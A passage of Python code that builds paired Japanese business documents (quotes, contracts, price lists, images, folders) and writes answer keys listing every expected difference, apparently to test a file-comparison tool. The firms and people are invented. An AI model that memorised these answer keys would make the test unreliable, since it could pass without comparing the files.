           f'「USB-C ドッキングステーション」の行を追加／小計 {yen(s0)}円→{yen(s1)}円、消費税 {yen(t0)}円→{yen(t1)}円、合計 {yen(s0 + t0)}円→{yen(s1 + t1)}円',
           '【2ページ】北浜電機商会の単価 151,500円→149,800円・備考に「再見積で値下げ」／承認の表「（100万円以上のとき）」→「要（合計が100万円以上のため）」　【3ページ】4台→5台（2か所）／「11月12日に1台の電源が…」の1文を追加／「ドッキングステーションは…」の1文を追加')

    # ---- 画像：座席レイアウト
    def seats(path, v):
        W, H = 1600, 1000; im = Image.new('RGB', (W, H), 'white'); dr = ImageDraw.Draw(im); dr.rectangle([20, 20, W - 20, H - 20], outline=(40, 40, 40), width=4)
        dr.text((50, 40), '本社 2階 総務部　座席レイアウト（' + ('2026年12月〜' if v else '2026年10月〜') + '）', fill='black', font=font(34, True))
        names = ['大久保', '宮原', '相沢', '桑田', '野々村', '長尾', '比嘉', '守屋', '柳瀬', '藤枝', '（空席）', '新垣']
        if v: names[1], names[6] = names[6], names[1]; names[10] = '浜口'
        for i, n in enumerate(names):
            x, y = 120 + (i % 4) * 300, 180 + (i // 4) * 220; dr.rectangle([x, y, x + 240, y + 130], outline=(60, 60, 60), width=3, fill=(238, 244, 252) if n != '（空席）' else (240, 240, 240))
            w = dr.textlength(n, font=font(34)); dr.text((x + 120 - w / 2, y + 42), n, fill='black', font=font(34))
        cx = 1360 if not v else 1360; cy = 200 if not v else 640
        dr.rectangle([cx, cy, cx + 180, cy + 120], outline=(180, 60, 0), width=4, fill=(255, 236, 214)); dr.text((cx + 36, cy + 40), '複合機', fill=(120, 40, 0), font=font(34))
        if v: dr.rectangle([1360, 200, 1540, 320], outline=(0, 110, 60), width=4, fill=(220, 245, 228)); dr.text((1378, 240), '書庫（鍵）', fill=(0, 80, 40), font=font(30))
        dr.rectangle([60, 860, 360, 940], outline=(60, 60, 60), width=3); dr.text((150, 880), '出入口', fill='black', font=font(34)); im.save(P(path))
    seats(f'{d}/座席レイアウト_変更前.png', 0); seats(f'{d}/座席レイアウト_変更後.png', 1)
    key(d, '画像（PNG 1600×1000、位置ずれなし）座席レイアウト_変更前.png → 座席レイアウト_変更後.png：題名の「2026年10月〜」→「2026年12月〜」／「宮原」と「比嘉」の席が入れ替わる（上段の左から2番目と、中段の左から3番目）／'
           '下段の左から3番目「（空席）」→「浜口」（席の色も灰色→水色）／「複合機」が右上から右の中ほどへ移動／右上の元の場所に「書庫（鍵）」（緑の枠）を追加。変わった所は 6 か所（題名・席2つ・席1つ・複合機の移動先・書庫）')

    # ---- パスワード付き PDF
    def shoyo(v): return [['# 2026年 冬季賞与 支給案' + ('（修正版）' if v else ''), '社外秘・取扱注意　　　　　　　　　　　　　　　　　　2026年11月' + ('24' if v else '17') + '日　総務部', '',
                           '1. 支給日　　　2026年12月' + ('11日（金）' if v else '10日（木）'), '2. 支給対象　　2026年11月30日に在籍する正社員・嘱託社員（412名）', '3. 算定期間　　2026年4月1日〜9月30日',
                           '4. 支給月数　　基本給の ' + ('2.3' if v else '2.1') + ' か月分（前年冬 2.0 か月分）', '5. 原資　　　　' + ('3億2,430万円' if v else '2億9,610万円') + '（概算）', '6. 評価の反映　S：+20％　A：+10％　B：±0％　C：−10％',
                           '7. 労働組合との協議　11月' + ('26' if v else '19') + '日（予定）', '', '※ この資料は、役員会の決定までは部外秘とする。']]
    _pdf(f'{d}/冬季賞与支給案_初版.pdf', shoyo(0), size=12); _pdf(f'{d}/_tmp_shoyo.pdf', shoyo(1), size=12)
    encrypt_pdf(P(f'{d}/_tmp_shoyo.pdf'), P(f'{d}/冬季賞与支給案_修正版（パスワード付き）.pdf'), 'soumu-2026'); os.remove(P(f'{d}/_tmp_shoyo.pdf'))
    key(d, 'パスワード付き PDF（AES-256、パスワード soumu-2026）冬季賞与支給案_初版.pdf（パスワードなし）→ 冬季賞与支給案_修正版（パスワード付き）.pdf：題名に「（修正版）」／日付 11月17日→11月24日／支給日 12月10日（木）→12月11日（金）／'
           '支給月数 2.1→2.3 か月分／原資 2億9,610万円→3億2,430万円／協議 11月19日→11月26日（変更は 6 行）')

    # ---- フォルダ（各15ファイル）
    doc = lambda t, n: f'{t}\n北浜精機株式会社 総務部\n\n' + ''.join(f'{i + 1}. {t}の第{i + 1}項。内容は、総務部の共有フォルダにある原本による。\n' for i in range(n))
    naisen = lambda v: '氏名,部署,内線\n大久保 俊,製造部,3001\n宮原 さやか,総務部,2104\n相沢 悠,総務部,' + ('2110' if v else '2105') + '\n桑田 直子,経理部,2201\n野々村 健,営業部,2301\n' + ('浜口 真司,総務部,2106\n' if v else '')
    renraku = '順番,氏名,連絡先\n1,大久保,090-5555-0101\n2,宮原,090-5555-0102\n3,相沢,090-5555-0103\n4,桑田,090-5555-0104\n'
    logo = io.BytesIO(); li = Image.new('RGB', (240, 80), (20, 70, 140)); ImageDraw.Draw(li).text((24, 20), '北浜精機', fill='white', font=font(34, True)); li.save(logo, 'PNG')
    com = {'01_規程/就業規則.txt': doc('就業規則', 30), '01_規程/慶弔見舞金規程.txt': doc('慶弔見舞金規程', 12), '02_様式/休暇届.txt': doc('休暇届', 6), '02_様式/出張申請書.txt': doc('出張申請書', 8),
           '03_議事録/2026-09_安全衛生委員会.txt': doc('安全衛生委員会 議事録（9月）', 10), '03_議事録/2026-10_安全衛生委員会.txt': doc('安全衛生委員会 議事録（10月）', 10),
           '04_名簿/座席表.csv': '席,氏名\nA1,大久保\nA2,宮原\nA3,相沢\n', '05_その他/年間行事予定.txt': doc('年間行事予定', 12), '05_その他/防災マニュアル.txt': doc('防災マニュアル', 20)}
    L = dict(com); Rr = dict(com)
    L['01_規程/旅費規程.txt'] = doc('旅費規程', 15); Rr['01_規程/旅費規程.txt'] = doc('旅費規程', 15).replace('第7項。', '第7項（日当を 2,000円から 2,500円に改定）。')
    L['02_様式/備品購入申請書.txt'] = doc('備品購入申請書', 6); Rr['02_様式/備品購入申請書.txt'] = doc('備品購入申請書', 7)
    L['04_名簿/内線番号表.csv'] = naisen(0); Rr['04_名簿/内線番号表.csv'] = naisen(1)
    L['02_様式/旧様式/残業申請書_2019.txt'] = doc('残業申請書（2019年の様式）', 5); Rr['03_議事録/2026-11_安全衛生委員会.txt'] = '\n'.join(B) + '\n'
    for side, m in (('共有フォルダ_10月末', L), ('共有フォルダ_11月末', Rr)):
        for k, v in m.items(): text(f'{d}/{side}/{k}', v)
        wbytes(f'{d}/{side}/05_その他/ロゴ.png', logo.getvalue())
    text(f'{d}/共有フォルダ_10月末/04_名簿/緊急連絡網.csv', renraku, eol='\r\n'); text(f'{d}/共有フォルダ_11月末/04_名簿/緊急連絡網.csv', renraku, eol='\n')
    cnt = lambda s: sum(len(fs) for _, _, fs in os.walk(P(f'{d}/{s}/x')[:-2])); assert cnt('共有フォルダ_10月末') == 15 and cnt('共有フォルダ_11月末') == 15
    key(d, 'フォルダ（各 15 ファイル、サブフォルダ 5 つ＋「02_様式/旧様式」）共有フォルダ_10月末 ↔ 共有フォルダ_11月末：同じ内容 10（うち1つは画像 05_その他/ロゴ.png）／内容が違う 3（01_規程/旅費規程.txt＝第7項の1行、'
           '02_様式/備品購入申請書.txt＝末尾に1行追加、04_名簿/内線番号表.csv＝相沢の内線 2105→2110 と 浜口の行の追加）／改行コードだけが違う 1（04_名簿/緊急連絡網.csv＝左 CRLF・右 LF。文字は同じ）／'
           '左だけ 1（02_様式/旧様式/残業申請書_2019.txt）／右だけ 1（03_議事録/2026-11_安全衛生委員会.txt）',
           'このレビュアーは、題材の中身よりも、キーボードだけで操作できるか・フォーカスが見えるか・読み上げ用の情報があるかを見る')


# ==========================================================================================
# R18 営業部：タブレット・小さな画面で使う人（見積・契約書・価格表・カタログ・長いファイル名・フォルダ）
# ==========================================================================================
_LONG18 = '【重要】２０２６年度下期　業務用パッケージエアコンおよび全熱交換器　標準価格改定のご案内（北関東エリア販売代理店様向け）＿営業企画部作成＿第３稿'


def r18(d):
    rnd = random.Random(1818)
    # ---- 見積書（PDF 2ページ）
    def mitsumori(v):
        it = [['室外機（ビル用マルチ 28kW）', 'TRU-280S', 2, '台', 1240000 if v else 1280000], ['室内機（天井カセット4方向 5.6kW）', 'TCA-56S', 14 if v else 12, '台', 168000], ['室内機（天井カセット4方向 3.6kW）', 'TCA-36S', 6, '台', 142000],
              ['室内機（壁掛 2.8kW）', 'TKW-28A', 4, '台', 98000], ['全熱交換器（天井埋込 500m3/h）', 'TVX-500A', 3, '台', 215000], ['ワイヤードリモコン', 'TOP-RC2', 20 if v else 18, '個', 12800]]
        if v: it.append(['集中リモコン（64系統）', 'TOP-CC64', 1, '台', 186000])
        it += [['冷媒配管工事（既設配管の洗浄を含む）', '―', 1, '式', 1860000], ['ドレン配管工事', '―', 1, '式', 420000], ['電気工事（動力・渡り配線）', '―', 1, '式', 680000], ['既設機器の撤去・フロン回収・処分', '―', 1, '式', 540000],
               ['搬入・揚重（クレーン 25t、夜間作業）', '―', 1, '式', 380000], ['試運転調整・取扱説明', '―', 1, '式', 150000], ['現場管理費・諸経費', '―', 1, '式', 620000]]
        sub = sum(r[2] * r[4] for r in it); disc = 300000 if v else 150000; net = sub - disc; tax = net // 10
        rows = [['No.', '品名・仕様', '型式', '数量', '単位', '単価', '金額']] + [[i + 1, r[0], r[1], r[2], r[3], yen(r[4]), yen(r[2] * r[4])] for i, r in enumerate(it)]
        rows += [['', '小計', '', '', '', '', yen(sub)], ['', '出精値引き', '', '', '', '', '△' + yen(disc)], ['', '消費税（10％）', '', '', '', '', yen(tax)], ['', '合計（税込）', '', '', '', '', yen(net + tax)]]
        b = [('raw', f'<p class="r">見積番号　Q-2611-0457{"-R1" if v else ""}<br>2026年11月{"26" if v else "12"}日</p>'), '# 御 見 積 書', ('raw', '<p style="font-size:13pt"><u>医療法人みなと会　みなと総合病院　施設課　御中</u></p>'),
             ('raw', '<p class="r">株式会社東都エアテック　北関東支店<br>〒330-0000 埼玉県さいたま市大宮区桜木町0-0-0<br>電話 048-555-0126　担当：営業1課 日下部</p>'),
             '件名：みなと総合病院 東館 空調設備更新工事', ('raw', f'<p style="font-size:14pt;border-bottom:2px solid #000;display:inline-block">御見積金額　￥{yen(net + tax)}－（税込）</p>'), ('table', rows), '---pb---', '## 見積条件',
             ('table', [['納期', '受注後 ' + ('10' if v else '8') + '週間（機器の納入）。工事は、納入後 3週間'], ['工事の時間帯', '平日 9時〜17時。搬入・揚重のみ夜間（22時〜翌5時）'], ['支払条件', '検収の月末締め、翌月末 銀行振込'], ['見積の有効期限', '2026年12月' + ('25' if v else '11') + '日'],
                        ['保証', '引渡しから ' + ('2年' if v else '1年') + '（圧縮機は 5年）'], ['含まないもの', '天井の開口・復旧、塗装、アスベストの調査と除去、官公庁への届出の手数料']], 'nohead'),
             '## 備考', '　1. 既設の冷媒配管を再利用する前提です。調査の結果、再利用できないときは、別途お見積りします。', '　2. 病棟の工事は、1フロアずつ、3日間の停止でお願いします。', '　3. フロンの回収・破壊の証明書を、工事の完了後にお渡しします。'] + (['　4. 室内機 2台と集中リモコンは、11月20日のお打合せでのご要望により追加しました。'] if v else [])
        return page(hb(b), serif=False, size='10pt', css='td:nth-child(n+4){text-align:right}'), sub, disc, net + tax
    (q0, s0, d0, g0), (q1, s1, d1, g1) = mitsumori(0), mitsumori(1); mm = {'top': '18mm', 'bottom': '16mm', 'left': '16mm', 'right': '16mm'}
    for nm, h in (('御見積書_Q-2611-0457_第1版.pdf', q0), ('御見積書_Q-2611-0457_第2版.pdf', q1)): cpdf(f'{d}/{nm}', h, margin=mm, display_header_footer=True, header_template=hf('', ''), footer_template=hf('株式会社東都エアテック', '{p} / {n}'))
    key(d, f'見積書（PDF 2ページ）御見積書_Q-2611-0457_第1版.pdf → 第2版.pdf：【1ページ】見積番号に「-R1」／日付 11月12日→11月26日／室外機の単価 1,280,000→1,240,000（金額 2,560,000→2,480,000）／室内機 TCA-56S の数量 12→14（金額 2,016,000→2,352,000）／'
           f'リモコンの数量 18→20（金額 230,400→256,000）／「集中リモコン（64系統）」の行を追加（No.7。以降の No. が1つずつずれる）／小計 {yen(s0)}→{yen(s1)}／出精値引き △{yen(d0)}→△{yen(d1)}／消費税／合計（税込）{yen(g0)}→{yen(g1)}（表の合計と、上の「御見積金額」の2か所）',
           '【2ページ】納期 8週間→10週間／有効期限 12月11日→12月25日／保証 1年→2年／備考に「4. 室内機 2台と集中リモコンは…」を追加')

    # ---- 契約書（Word）
    def keiyaku(v):
        n = lambda k: k + (1 if v and k >= 9 else 0)   # 先方修正版では第9条（再委託）が加わり、以降が1つずれる
        a = ['東都エアテック（以下「甲」という。）と医療法人みなと会（以下「乙」という。）は、乙の施設の空調設備の保守について、次のとおり契約を結ぶ。',
             '（目的）', '第1条　甲は、乙の「みなと総合病院 東館」の空調設備（別紙の機器一覧のとおり。以下「対象設備」という。）の保守を行い、乙は、その対価を支払う。',
             '（保守の内容）', '第2条　甲が行う保守は、次のとおりとする。', '(1) 定期点検　年' + ('4回' if v else '2回') + '（フィルターの清掃、冷媒の圧力・電流の測定、ドレンの確認）', '(2) フロン排出抑制法に定める簡易点検（3か月に1回）及び定期点検の記録', '(3) 故障のときの修理（部品代を含む。ただし、第5条に定めるものを除く。）',
             '（契約の期間）', '第3条　契約の期間は、2027年1月1日から' + ('2029年12月31日までの3年間' if v else '2027年12月31日までの1年間') + 'とする。期間の満了の' + ('2か月前' if v else '3か月前') + 'までに、甲乙いずれからも書面による申し出がないときは、同じ条件で1年間延長し、以後も同様とする。',
             '（保守料）', '第4条　保守料は、月額 ' + ('172,000円' if v else '186,000円') + '（消費税を別とする。）とし、乙は、毎月末日までに、翌月分を甲の指定する口座に振り込む。振込の手数料は、乙の負担とする。',
             '（保守に含まないもの）', '第5条　次のものは、保守に含まない。', '(1) 天災、火災、乙の故意又は過失による故障の修理', '(2) 対象設備の移設、増設及び改造', '(3) 圧縮機及び熱交換器の交換' + ('（設置から10年を過ぎたものに限る。）' if v else ''),
             '（故障のときの対応）', '第6条　甲は、乙から故障の連絡を受けたときは、' + ('2時間' if v else '4時間') + '以内に技術員を派遣する。受付は、24時間365日とする。', '2　手術室及び集中治療室の系統の故障は、他の系統に優先して対応する。',
             '（報告）', '第7条　甲は、点検及び修理を行ったときは、その結果を、作業の日から7日以内に書面で乙に報告する。',
             '（立入り）', '第8条　甲の技術員は、乙の施設に立ち入るときは、乙の定める感染対策及び入館の手続きに従う。']
        if v: a += ['（再委託）', '第9条　甲は、乙の書面による承諾を得たときに限り、保守の一部を第三者に委託することができる。この場合、甲は、その第三者の行為について、自らの行為と同じ責任を負う。']
        a += ['（秘密の保持）', f'第{n(9)}条　甲及び乙は、この契約によって知った相手方の業務上の秘密（患者の情報を含む。）を、契約の期間中も終了後も、第三者に漏らしてはならない。',
              '（損害の賠償）', f'第{n(10)}条　甲は、甲の責めに帰すべき事由によって乙に損害を与えたときは、' + ('直接かつ現実に生じた損害について、保守料の12か月分を上限として' if not v else '直接かつ現実に生じた損害について、保守料の24か月分を上限として') + '賠償する。' + ('ただし、甲の故意又は重大な過失による損害については、この上限を適用しない。' if v else ''),
              '（解約）', f'第{n(11)}条　甲又は乙は、' + ('2か月前' if v else '3か月前') + 'までに書面で通知することにより、この契約を解約することができる。', '2　相手方がこの契約に違反し、催告しても14日以内に改めないときは、ただちに解約することができる。',
              '（反社会的勢力の排除）', f'第{n(12)}条　甲及び乙は、自ら及びその役員が、暴力団その他の反社会的勢力でないことを表明し、保証する。',
              '（協議）', f'第{n(13)}条　この契約に定めのない事項及び疑義が生じた事項は、甲乙が誠意をもって協議して決める。',
              '（管轄）', f'第{n(14)}条　この契約に関する訴えは、' + ('横浜地方裁判所' if v else 'さいたま地方裁判所') + 'を第一審の専属的合意管轄裁判所とする。',
              'この契約の成立を証するため、本書2通を作り、甲乙が記名押印のうえ、各1通を持つ。', '2026年12月　　日',
              ('table', [['甲', '埼玉県さいたま市大宮区桜木町0-0-0　株式会社東都エアテック　北関東支店長　　有 馬　 徹'], ['乙', '神奈川県横浜市みなと区海岸通0-0　医療法人みなと会　理事長　　設 楽　 恭 子']])]
        return a
    rdocx(f'{d}/空調設備保守契約書_当社案.docx', '空調設備保守サービス契約書', keiyaku(0), header='東都エアテック　標準書式 M-03', footer='page')
    rdocx(f'{d}/空調設備保守契約書_先方修正版.docx', '空調設備保守サービス契約書', keiyaku(1), header='東都エアテック　標準書式 M-03（みなと総合病院様 修正）', footer='page')
    k0 = [x for x in keiyaku(0) if isinstance(x, str)]; k1 = [x for x in keiyaku(1) if isinstance(x, str)]; assert _only(k0, k1) == (11, 13)
    key(d, '契約書（Word、当社案は全14条・先方修正版は全15条）空調設備保守契約書_当社案.docx → 空調設備保守契約書_先方修正版.docx：第2条(1) 年2回→年4回／第3条 「2027年12月31日までの1年間」→「2029年12月31日までの3年間」・満了の3か月前→2か月前／'
           '第4条 月額 186,000円→172,000円／第5条(3) に「（設置から10年を過ぎたものに限る。）」を追加／第6条 4時間→2時間／第9条（再委託）を新設（見出しと本文の2段落）／このため旧第9条〜第14条が第10条〜第15条へ（6つの条の番号）／'
           '損害の賠償 保守料の12か月分→24か月分・ただし書き（故意又は重大な過失）を追加／解約 3か月前→2か月前／管轄 さいたま地方裁判所→横浜地方裁判所／ヘッダーに「（みなと総合病院様 修正）」。変わった段落は、当社案の 11 段落 → 先方修正版の 13 段落（うち 2 段落が新設の第9条）')

    # ---- 価格表（Excel、240機種）
    ser = [('TCA', '天井カセット4方向', 1.00, 58), ('TCH', '天井吊', 0.92, 58), ('TKW', '壁掛', 0.70, 60), ('TFY', '床置', 1.05, 60), ('TDC', '天井埋込ダクト', 1.10, 62), ('TRU', '室外機（ビル用マルチ）', 2.60, 55), ('TVX', '全熱交換器', 0.85, 64), ('TPK', '店舗用パッケージ（同時ツイン）', 1.75, 57)]
    caps = [28, 36, 45, 56, 63, 71, 80, 90, 112, 140, 160, 224, 280]; suf = [('A', '標準'), ('S', '省エネ'), ('H', '寒冷地'), ('C', '耐塩害')]
    allm = [(f'{s[0]}-{c}{x[0]}', s[1], f'{s[1]} {c / 10:.1f}kW（{x[1]}）', c / 10, int(round(c * 2900 * s[2] * {'A': 1.0, 'S': 1.12, 'H': 1.18, 'C': 1.15}[x[0]], -3)), s[3]) for s in ser for c in caps for x in suf]
    rnd.shuffle(allm); cur = sorted(allm[:240]); extra = allm[240:245]
    ch = rnd.sample(range(240), 25 + 3 + 4); up, gone, rate = set(ch[:25]), set(ch[25:28]), set(ch[28:])
    new = []
    for i, r in enumerate(cur):
        if i in gone: continue
        r = list(r)
        if i in up: r[4] = int(round(r[4] * (1 + rnd.choice([3, 4, 5, 6, 8]) / 100), -3))
        if i in rate: r[5] -= 2
        new.append(tuple(r))
    new = sorted(new + [tuple(list(r[:5]) + [r[5]]) for r in extra])
    def kakaku(path, rows, title, newset=()):
        wb = xlsxwriter.Workbook(P(path)); ws = wb.add_worksheet('標準価格表'); h = wb.add_format({'bold': True, 'bg_color': '#DDEBF7', 'border': 1, 'align': 'center'}); n = wb.add_format({'num_format': '#,##0'}); pc = wb.add_format({'num_format': '0%'}); k1 = wb.add_format({'num_format': '0.0'})
        ws.merge_range(0, 0, 0, 7, title, wb.add_format({'bold': True, 'size': 13})); ws.write_row(1, 0, ['型式', 'シリーズ', '品名', '能力(kW)', '標準価格（税抜）', '仕切率', '仕切価格（税抜）', '備考'], h)
        for i, r in enumerate(rows):
            x = i + 3; ws.write_string(i + 2, 0, r[0]); ws.write_string(i + 2, 1, r[1]); ws.write_string(i + 2, 2, r[2]); ws.write_number(i + 2, 3, r[3], k1); ws.write_number(i + 2, 4, r[4], n); ws.write_number(i + 2, 5, r[5] / 100, pc)
            ws.write_formula(i + 2, 6, f'=ROUND(E{x}*F{x},0)', n, (r[4] * r[5] + 50) // 100); ws.write_string(i + 2, 7, '新機種' if r[0] in newset else '')
        ws.set_column(0, 0, 12); ws.set_column(1, 1, 26); ws.set_column(2, 2, 40); ws.set_column(3, 6, 15); ws.freeze_panes(2, 0); ws.autofilter(1, 0, len(rows) + 1, 7); wb.close()
    kakaku(f'{d}/標準価格表_2026年度上期.xlsx', cur, '株式会社東都エアテック　標準価格表　2026年度上期（2026年4月1日〜）'); kakaku(f'{d}/標準価格表_2026年度下期.xlsx', new, '株式会社東都エアテック　標準価格表　2026年度下期（2026年10月1日〜）', {r[0] for r in extra})
    orow = {r[0]: i + 3 for i, r in enumerate(cur)}; nrow = {r[0]: i + 3 for i, r in enumerate(new)}; assert len(cur) == 240 and len(new) == 242 and len(nrow) == 242
    pair = lambda idx: '、'.join(f'{cur[i][0]}（{orow[cur[i][0]]}行→{nrow[cur[i][0]]}行）' for i in sorted(idx))
    key(d, '価格表（Excel、1行目は題名・2行目が見出し。上期 240 機種＝3〜242行、下期 242 機種＝3〜244行。仕切価格は =ROUND(標準価格×仕切率,0) の数式）標準価格表_2026年度上期.xlsx → 標準価格表_2026年度下期.xlsx：1行目の題名（上期→下期、4月1日→10月1日）',
           f'標準価格の値上げ 25 機種（標準価格と仕切価格の2つのセルが変わる。型式（上期の行→下期の行））：{pair(up)}',
           f'仕切率の変更 4 機種（2ポイント下げ。仕切率と仕切価格の2つのセル）：{pair(rate)}', f'削除 3 機種（上期の行）：' + '、'.join(f'{cur[i][0]}（{orow[cur[i][0]]}行）' for i in sorted(gone)),
           f'追加 5 機種（下期の行。備考に「新機種」）：' + '、'.join(f'{r[0]}（{nrow[r[0]]}行）' for r in sorted(extra)), '行の追加・削除のあとは行番号がずれ、仕切価格の数式の参照（E・F の行番号）もずれる。ずれただけの行を「変更」にしないこと')

    # ---- カタログのページ画像（JPEG）
    def catalog(path, v):
        W, H = 1654, 2339; im = Image.new('RGB', (W, H), 'white'); dr = ImageDraw.Draw(im); band = (0, 92, 170) if not v else (0, 128, 96)
        dr.rectangle([0, 0, W, 190], fill=band); dr.text((70, 54), '天井カセット4方向　TCA シリーズ', fill='white', font=font(64, True)); dr.text((W - 300, 78), '店舗・オフィス用', fill='white', font=font(34))
        for i, (c, t) in enumerate([((205, 222, 240), '室内機（パネル）'), ((222, 236, 214), '設置例（事務所）'), ((244, 228, 208), 'ワイヤードリモコン')]):
            x = 70 + i * 515; dr.rectangle([x, 250, x + 480, 640], fill=c, outline=(120, 120, 120), width=3); w = dr.textlength(t, font=font(36)); dr.text((x + 240 - w / 2, 420), t, fill=(70, 70, 70), font=font(36))
        if v: dr.ellipse([420, 220, 580, 380], fill=(214, 40, 40)); dr.text((448, 272), 'NEW', fill='white', font=font(48, True))
        dr.text((70, 700), '人のいる場所を見つけて、風を送り分ける。' if not v else '人のいる場所を見つけて、風を送り分ける。年間の電気代を約12％削減。', fill=(20, 20, 20), font=font(40, True))
        rows = [['型式', 'TCA-36S', 'TCA-56S', 'TCA-80S', 'TCA-140S'], ['冷房能力 (kW)', '3.6', '5.6', '8.0', '14.0'], ['暖房能力 (kW)', '4.0', '6.3', '9.0', '16.0'], ['通年エネルギー消費効率 APF', '6.1' if not v else '6.4', '5.9' if not v else '6.2', '5.6', '5.2'],
                ['運転音 (dB)', '28', '31', '35', '41' if not v else '39'], ['質量 (kg)', '19', '21', '24', '29'], ['標準価格（税抜）', '418,000円' if not v else '438,000円', '486,000円' if not v else '509,000円', '602,000円', '874,000円']]
        y0 = 800
        for r, row in enumerate(rows):
            for c, cell in enumerate(row):
                x = 70 + (0 if c == 0 else 520 + (c - 1) * 250); w = 520 if c == 0 else 250; dr.rectangle([x, y0 + r * 96, x + w, y0 + (r + 1) * 96], outline=(60, 60, 60), width=2, fill=(232, 238, 246) if r == 0 or c == 0 else 'white')
                dr.text((x + 16, y0 + r * 96 + 28), cell, fill='black', font=font(32, r == 0))
        for i, s in enumerate(['● 4方向の吹き出しを、1方向ずつ調節できます。', '● フィルターの自動清掃パネル（別売）に対応。', '● 既設の冷媒配管を再利用できます（条件があります）。', '● 寒冷地仕様（型式の末尾 H）は、外気 −25℃ まで暖房運転できます。']): dr.text((70, 1540 + i * 70), s, fill=(30, 30, 30), font=font(36))
        dr.rectangle([70, 1880, W - 70, 2120], outline=band, width=5); dr.text((100, 1905), 'ご注意', fill=band, font=font(36, True))
        dr.text((100, 1965), '・価格には、工事費・リモコン・配管部材を含みません。', fill=(40, 40, 40), font=font(30)); dr.text((100, 2015), '・APF は JIS B 8616:2015 による値です。' + ('' if not v else '（2026年10月の測定）'), fill=(40, 40, 40), font=font(30))
        dr.text((100, 2065), '・この価格は ' + ('2026年4月1日' if not v else '2026年10月1日') + ' からのものです。', fill=(40, 40, 40), font=font(30))
        dr.text((70, 2240), '株式会社東都エアテック　総合カタログ 2026' + ('' if not v else ' 秋冬号'), fill=(90, 90, 90), font=font(28)); dr.text((W - 130, 2240), '12', fill=(90, 90, 90), font=font(32, True)); im.save(P(path), quality=90, dpi=(200, 200))
    catalog(f'{d}/カタログ_p12_TCAシリーズ_旧.jpg', 0); catalog(f'{d}/カタログ_p12_TCAシリーズ_新.jpg', 1)
    key(d, 'カタログのページ画像（JPEG 1654×2339）カタログ_p12_TCAシリーズ_旧.jpg → 新.jpg：上の帯と「ご注意」の枠の色（青→緑）／左の写真の右上に赤い丸の「NEW」／見出しの文に「年間の電気代を約12％削減。」を追加／'
           '表：APF 6.1→6.4（TCA-36S）・5.9→6.2（TCA-56S）、運転音 41→39（TCA-140S）、標準価格 418,000円→438,000円（TCA-36S）・486,000円→509,000円（TCA-56S）／ご注意の2行目に「（2026年10月の測定）」、3行目 4月1日→10月1日／左下に「 秋冬号」。'
           'JPEG なので、同じ絵の部分にも圧縮による細かな違いがある（それを変更として拾いすぎないこと）')

    # ---- 長いファイル名（全角 60 文字以上。左右でよく似た名前）
    la, lb = _LONG18 + '.txt', _LONG18 + '（支店長確認済み）.txt'; assert len(_LONG18) >= 60 and len(lb.encode('utf-8')) <= 255, (len(_LONG18), len(lb.encode('utf-8')))
    annai = lambda v: '\n'.join(['販売代理店 各位', '2026年' + ('9月1日' if not v else '9月8日'), '株式会社東都エアテック 北関東支店', '', '標準価格改定のご案内', '',
                                  '拝啓　平素は格別のお引き立てを賜り、厚く御礼申し上げます。', 'さて、銅・アルミニウムなどの原材料と物流費の値上がりが続いており、弊社の努力だけでは価格を維持することが難しくなりました。',
                                  'つきましては、下記のとおり標準価格を改定いたします。何とぞご理解くださいますようお願い申し上げます。', '敬具', '', '記', '',
                                  '1. 対象　業務用パッケージエアコン、全熱交換器（一部の機種）', '2. 改定の幅　標準価格の 3〜8％', '3. 実施日　2026年10月1日のご注文分から',
                                  '4. 経過措置　' + ('9月30日までにお見積りを提出済みの案件は、10月31日のご注文分まで旧価格とします。' if not v else '9月30日までにお見積りを提出済みの案件は、11月30日のご注文分まで旧価格とします。'),
                                  '5. お問い合わせ　北関東支店 営業1課（電話 048-555-0126）'] + (['6. 新しい価格表は、9月15日に代理店様向けサイトに掲載します。'] if v else []) + ['', '以上', ''])
    text(f'{d}/{la}', annai(0)); text(f'{d}/{lb}', annai(1))
    key(d, f'長いファイル名（拡張子を除いて全角 {len(_LONG18)} 文字と {len(lb) - 4} 文字。末尾の「（支店長確認済み）」だけが違う）の txt 2つ：2行目 9月1日→9月8日／17行目（経過措置）10月31日→11月30日／19行目に「6. 新しい価格表は…」を追加。'
           'ファイル欄・タブ・レポートの見出しで、名前の違う部分（末尾）が見えること、画面からはみ出さないこと')

    # ---- フォルダ（各20ファイル）
    def png(label, mark=False):
        im = Image.new('RGB', (900, 600), 'white'); dr = ImageDraw.Draw(im); dr.rectangle([20, 20, 880, 580], outline='black', width=3); dr.text((40, 34), label, fill='black', font=font(30, True))
        for k in range(6): dr.rectangle([70 + k * 135, 200, 160 + k * 135, 290], outline=(0, 92, 170), width=3); dr.line([115 + k * 135, 290, 115 + k * 135, 420], fill=(0, 92, 170), width=3)
        dr.line([115, 420, 790, 420], fill=(0, 92, 170), width=4); dr.rectangle([720, 440, 840, 540], outline=(200, 60, 0), width=4); dr.text((742, 472), '室外機', fill=(200, 60, 0), font=font(24))
        if mark: dr.rectangle([70 + 6 * 135 - 135 * 0, 80, 160 + 6 * 135 - 135 * 0 - 60, 170], outline=(214, 40, 40), width=4); dr.text((70, 130), '室内機 2台を追加（赤枠）', fill=(214, 40, 40), font=font(26))
        b = io.BytesIO(); im.save(b, 'PNG'); return b.getvalue()
    memo = lambda t, n: f'{t}\n株式会社東都エアテック 北関東支店\n\n' + ''.join(f'{i + 1}. {t}（{i + 1}）\n' for i in range(n))
    kiki = lambda v: '系統,型式,台数\n東館1階,TCA-56S,4\n東館2階,TCA-56S,' + ('6' if v else '4') + '\n東館3階,TCA-56S,4\n東館3階,TCA-36S,6\n屋上,TRU-280S,2\n' + ('事務室,TOP-CC64,1\n' if v else '')
    com = {'01_提案書/工程表.csv': '工程,開始,終了\n機器の手配,2027-01-12,2027-03-05\n東館1階,2027-03-08,2027-03-10\n東館2階,2027-03-15,2027-03-17\n東館3階,2027-03-22,2027-03-24\n試運転,2027-03-25,2027-03-26\n',
           '01_提案書/体制図.txt': memo('体制図', 6), '04_カタログ/TCAシリーズ.txt': memo('TCA シリーズ 仕様', 12), '04_カタログ/TRUシリーズ.txt': memo('TRU シリーズ 仕様', 12), '04_カタログ/TVXシリーズ.txt': memo('TVX シリーズ 仕様', 10),
           '05_会社案内/会社概要.txt': memo('会社概要', 8), '05_会社案内/保守拠点一覧.csv': '拠点,住所,電話\n北関東支店,さいたま市大宮区,048-555-0126\n横浜サービスセンター,横浜市みなと区,045-555-0149\n', '05_会社案内/施工実績.csv': '年度,施設,台数\n2024,青葉台クリニック,18\n2025,北浜市立図書館,42\n2025,みなと商業高校,60\n',
